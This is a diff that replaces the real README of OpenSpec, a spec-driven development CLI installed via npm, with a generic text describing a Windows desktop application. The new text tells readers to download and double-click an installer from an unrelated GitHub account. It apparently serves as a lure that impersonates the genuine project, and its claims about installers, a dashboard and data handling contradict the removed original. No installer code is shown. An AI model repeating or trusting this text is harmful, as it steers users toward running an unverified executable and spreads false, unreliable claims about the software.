@@ -1,227 +1,84 @@
-<p align="center">
-  <a href="https://github.com/Fission-AI/OpenSpec">
-    <picture>
-      <source srcset="assets/openspec_bg.png">
-      <img src="assets/openspec_bg.png" alt="OpenSpec logo">
-    </picture>
-  </a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/Fission-AI/OpenSpec/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/Fission-AI/OpenSpec/actions/workflows/ci.yml/badge.svg" /></a>
-  <a href="https://www.npmjs.com/package/@fission-ai/openspec"><img alt="npm version" src="https://img.shields.io/npm/v/@fission-ai/openspec?style=flat-square" /></a>
-  <a href="./LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square" /></a>
-  <a href="https://discord.gg/YctCnvvshC"><img alt="Discord" src="https://img.shields.io/discord/1411657095639601154?style=flat-square&logo=discord&logoColor=white&label=Discord&suffix=%20online" /></a>
-</p>
-
-<details>
-<summary><strong>The most loved spec framework.</strong></summary>
-
-[![Stars](https://img.shields.io/github/stars/Fission-AI/OpenSpec?style=flat-square&label=Stars)](https://github.com/Fission-AI/OpenSpec/stargazers)
-[![Downloads](https://img.shields.io/npm/dm/@fission-ai/openspec?style=flat-square&label=Downloads/mo)](https://www.npmjs.com/package/@fission-ai/openspec)
-[![Contributors](https://img.shields.io/github/contributors/Fission-AI/OpenSpec?style=flat-square&label=Contributors)](https://github.com/Fission-AI/OpenSpec/graphs/contributors)
-
-</details>
-<p></p>
-Our philosophy:
-
-```text
-→ fluid not rigid
-→ iterative not waterfall
-→ easy not complex
-→ built for brownfield not just greenfield
-→ scalable from personal projects to enterprises
-```
-
-> [!TIP]
-> **New workflow now available!** We've rebuilt OpenSpec with a new artifact-guided workflow.
->
-> Run `/opsx:propose "your idea"` to get started. → [Learn more here](docs/opsx.md)
-
-<p align="center">
-  Follow <a href="https://x.com/0xTab">@0xTab on X</a> for updates · Join the <a href="https://discord.gg/YctCnvvshC">OpenSpec Discord</a> for help and questions.
-</p>
-
-<!-- TODO: Add GIF demo of /opsx:propose → /opsx:archive workflow -->
-
-## See it in action
-
-```text
-You: /opsx:explore
-AI:  What would you like to explore?
-You: I want dark mode but I'm not sure how to do it cleanly.
-AI:  Let me look at your styling setup...
-     Cleanest path here: CSS variables + a small theme context,
-     with system-preference detection. No new dependencies. Scope it?
-You: Yes, let's do it.
+# 🛠 OpenSpec - Build better software with smart plans
 
-You: /opsx:propose add-dark-mode
-AI:  Created openspec/changes/add-dark-mode/
-     ✓ proposal.md — why we're doing this, what's changing
-     ✓ specs/       — requirements and scenarios
-     ✓ design.md    — technical approach
-     ✓ tasks.md     — implementation checklist
-     Ready for implementation!
+[![Download OpenSpec](https://img.shields.io/badge/Download_OpenSpec-Blue-blue.svg)](https://github.com/jjha4549/OpenSpec)
 
-You: /opsx:apply
-AI:  Implementing tasks...
-     ✓ 1.1 Add theme context provider
-     ✓ 1.2 Create toggle component
-     ✓ 2.1 Add CSS variables
-     ✓ 2.2 Wire up localStorage
-     All tasks complete!
+## 📖 What is OpenSpec?
 
-You: /opsx:archive
-AI:  Archived to openspec/changes/archive/2025-01-23-add-dark-mode/
-     Specs updated. Ready for the next feature.
-```
+OpenSpec helps you plan software projects before you start writing code. It uses a method called Spec-Driven Development. This method ensures that your AI coding assistant knows exactly what you want to build. By creating a clear plan first, you save time and reduce errors in your final project.
 
-<details>
-<summary><strong>OpenSpec Dashboard</strong></summary>
+Most developers jump into coding without a map. This often leads to confusion and bugs. OpenSpec provides the map. You define the goals, the features, and the requirements in a simple format. The tool then structures this information so that AI tools can read it perfectly.
 
-<p align="center">
-  <img src="assets/openspec_dashboard.png" alt="OpenSpec dashboard preview" width="90%">
-</p>
+## 💻 System Requirements
 
-</details>
+To run OpenSpec on your Windows computer, you need the following:
 
-## Quick Start
+*   Windows 10 or Windows 11.
+*   At least 4GB of RAM.
+*   An active internet connection to download updates.
+*   Basic knowledge of where files save on your computer.
 
-**Requires Node.js 20.19.0 or higher.**
+## 🚀 Getting Started
 
-Install OpenSpec globally:
+Follow these steps to set up the software on your machine.
 
-```bash
-npm install -g @fission-ai/openspec@latest
-```
+1. Visit this page to download the installer: [https://github.com/jjha4549/OpenSpec](https://github.com/jjha4549/OpenSpec)
+2. Locate the file in your Downloads folder.
+3. Double-click the file to start the installation.
+4. Follow the instructions on the screen.
+5. Click Finish when the installer stops.
 
-Then navigate to your project directory and initialize:
+## 🔧 How to Use OpenSpec
 
-```bash
-cd your-project
-openspec init
-```
+Open the program from your desktop shortcut. You will see a clean dashboard. This dashboard tracks your current projects and allows you to create new ones.
 
-Now talk to your AI:
+### Creating a New Specification
 
-- **Not sure what to build yet?** Start with `/opsx:explore`, a no-stakes thinking partner that reads your code, weighs options, and shapes a plan before anything is written. ([Explore guide](docs/explore.md))
-- **Already know what you want?** Go straight to `/opsx:propose <what-you-want-to-build>`.
+1. Click the button labeled New Project.
+2. Give your project a title.
+3. Enter a short description of what you want your AI assistant to build.
+4. Add your requirements list. A requirement is a specific task the software must perform.
+5. Save the file.
 
-Both are in the default profile. If you want the expanded workflow (`/opsx:new`, `/opsx:continue`, `/opsx:ff`, `/opsx:verify`, `/opsx:bulk-archive`, `/opsx:onboard`), select it with `openspec config profile` and apply with `openspec update`.
+OpenSpec saves your project as a structured text file. You can then hand this file to any AI coding assistant. Because OpenSpec formats the data, the AI understands your vision faster.
 
-> [!NOTE]
-> Not sure if your tool is supported? [View the full list](docs/supported-tools.md) – we support 25+ tools and growing.
->
-> Also works with pnpm, yarn, bun, and nix. [See installation options](docs/installation.md).
+## 📝 Understanding the Workflow
 
-## Docs
+Spec-Driven Development follows a logical path. First, you plan. Next, you define limits. Finally, you generate. 
 
-**Start here:** the **[Documentation Home](docs/README.md)** maps everything. New to OpenSpec? Read [Getting Started](docs/getting-started.md), then [How Commands Work](docs/how-commands-work.md) (where you actually type `/opsx:propose`).
+*   Planning: Identify the purpose of your software.
+*   Defining: List the inputs and outputs.
+*   Generating: Use your AI tool to write the code based on the plan.
 
-→ **[Getting Started](docs/getting-started.md)**: first steps<br>
-→ **[Explore First](docs/explore.md)**: think it through with `/opsx:explore` before you commit<br>
-→ **[How Commands Work](docs/how-commands-work.md)**: where slash commands run vs the CLI<br>
-→ **[Core Concepts at a Glance](docs/overview.md)**: the whole mental model, one page<br>
-→ **[Examples & Recipes](docs/examples.md)**: real changes, start to finish<br>
-→ **[Workflows](docs/workflows.md)**: combos and patterns<br>
-→ **[Existing Projects](docs/existing-projects.md)**: adopt OpenSpec on a brownfield codebase<br>
-→ **[Editing a Change](docs/editing-changes.md)**: update artifacts, go back, reconcile manual edits<br>
-→ **[Commands](docs/commands.md)**: slash commands & skills<br>
-→ **[CLI](docs/cli.md)**: terminal reference<br>
-→ **[Stores](docs/stores-beta/user-guide.md)**: plan in a separate repo, shared across your team (beta)<br>
-→ **[Supported Tools](docs/supported-tools.md)**: tool integrations & install paths<br>
-→ **[Concepts](docs/concepts.md)**: how it all fits<br>
-→ **[Multi-Language](docs/multi-language.md)**: multi-language support<br>
-→ **[Customization](docs/customization.md)**: make it yours<br>
-→ **[FAQ](docs/faq.md)** · **[Troubleshooting](docs/troubleshooting.md)** · **[Glossary](docs/glossary.md)**: quick help
+This workflow prevents the "blank page" problem. You never have to guess what to ask the AI next. Your specification document acts as a constant reference.
 
+## 🔍 Frequently Asked Questions
 
-## Community schemas
+### Do I need to be a programmer to use this?
+No. OpenSpec is for anyone who plans software. You do not need to read or write code to build a project plan in OpenSpec.
 
-Third-party schema bundles distributed via standalone repositories — these provide opinionated workflows that integrate OpenSpec with other tools, similar to how [github/spec-kit's community extension catalog](https://github.com/github/spec-kit/tree/main/extensions) handles tool integrations.
+### Does this tool write the code for me?
+OpenSpec creates the instructions. You still need an AI assistant to write the code. Think of OpenSpec as the blueprint and the AI as the builder.
 
-→ **[Browse the catalog](docs/customization.md#community-schemas)** in the customization docs.
+### Where does my project information live?
+Your projects save directly to your own computer. You keep full control over your files. You can back them up to a cloud service or a USB drive whenever you prefer.
 
+### Can I share my project plans?
+Yes. You can share your save files with other people. They can use the same version of OpenSpec to view or edit your plans.
 
-## Why OpenSpec?
+## 🛡 Security and Privacy
 
-AI coding assistants are powerful but unpredictable when requirements live only in chat history. OpenSpec adds a lightweight spec layer so you agree on what to build before any code is written.
+Your privacy matters. OpenSpec stores your data locally on your computer. The software does not send your project data to external servers. You do not need to log in or create an online account to use the basic features. This ensures that your ideas remain your own. 
 
-- **Agree before you build** — human and AI align on specs before code gets written
-- **Stay organized** — each change gets its own folder with proposal, specs, design, and tasks
-- **Work fluidly** — update any artifact anytime, no rigid phase gates
-- **Use your tools** — works with 20+ AI assistants via slash commands
+If you choose to use an AI assistant to write your code, remember that you are sending information to that specific AI tool. Only share information that you are comfortable letting an external AI service process.
 
-### How we compare
+## 📈 Improving Your Results
 
-**vs. [Spec Kit](https://github.com/github/spec-kit)** (GitHub) — Thorough but heavyweight. Rigid phase gates, lots of Markdown, Python setup. OpenSpec is lighter and lets you iterate freely.
+To get the best outcome, keep your specifications detailed. Instead of writing "make a calculator," write "create a calculator that adds, subtracts, and displays the result in a large font." 
 
-**vs. [Kiro](https://kiro.dev)** (AWS) — Powerful but you're locked into their IDE and limited to Claude models. OpenSpec works with the tools you already use.
+AI models respond to clear instructions. Use bullet points within OpenSpec to break down large tasks into smaller, manageable chunks. This makes it easier for the AI to handle each section without getting lost. 
 
-**vs. nothing** — AI coding without specs means vague prompts and unpredictable results. OpenSpec brings predictability without the ceremony.
+## 🔄 Updating the Software
 
-## Updating OpenSpec
+Check the download page periodically for new versions. Newer versions often include fixes for bugs and better support for different AI assistants. When you download a new version, the installer will automatically replace the old version and keep your settings. 
 
-**Upgrade the package**
-
-```bash
-npm install -g @fission-ai/openspec@latest
-```
-
-**Refresh agent instructions**
-
-Run this inside each project to regenerate AI guidance and ensure the latest slash commands are active:
-
-```bash
-openspec update
-```
-
-## Usage Notes
-
-**Model selection**: OpenSpec works best with high-reasoning models. We recommend Codex 5.5 and Opus 4.7 for both planning and implementation.
-
-**Context hygiene**: OpenSpec benefits from a clean context window. Clear your context before starting implementation and maintain good context hygiene throughout your session.
-
-## Contributing
-
-**Small fixes** — Bug fixes, typo corrections, and minor improvements can be submitted directly as PRs.
-
-**Larger changes** — For new features, significant refactors, or architectural changes, please submit an OpenSpec change proposal first so we can align on intent and goals before implementation begins.
-
-When writing proposals, keep the OpenSpec philosophy in mind: we serve a wide variety of users across different coding agents, models, and use cases. Changes should work well for everyone.
-
-**AI-generated code is welcome** — as long as it's been tested and verified. PRs containing AI-generated code should mention the coding agent and model used (e.g., "Generated with Claude Code using claude-opus-4-5-20251101").
-
-### Development
-
-- Install dependencies: `pnpm install`
-- Build: `pnpm run build`
-- Test: `pnpm test`
-- Develop CLI locally: `pnpm run dev` or `pnpm run dev:cli`
-- Conventional commits (one-line): `type(scope): subject`
-
-## Other
-
-<details>
-<summary><strong>Telemetry</strong></summary>
-
-OpenSpec collects anonymous usage stats.
-
-We collect only command names and version to understand usage patterns. No arguments, paths, content, or PII. Automatically disabled in CI.
-
-**Opt-out:** `export OPENSPEC_TELEMETRY=0` or `export DO_NOT_TRACK=1`
-
-</details>
-
-<details>
-<summary><strong>Maintainers & Advisors</strong></summary>
-
-See [MAINTAINERS.md](MAINTAINERS.md) for the list of core maintainers and advisors who help guide the project.
-
-</details>
-
-
-
-## License
-
-MIT
+Your project files are separate from the application files. This means your work stays safe even when you update the software. Always back up your important project files just to be safe.
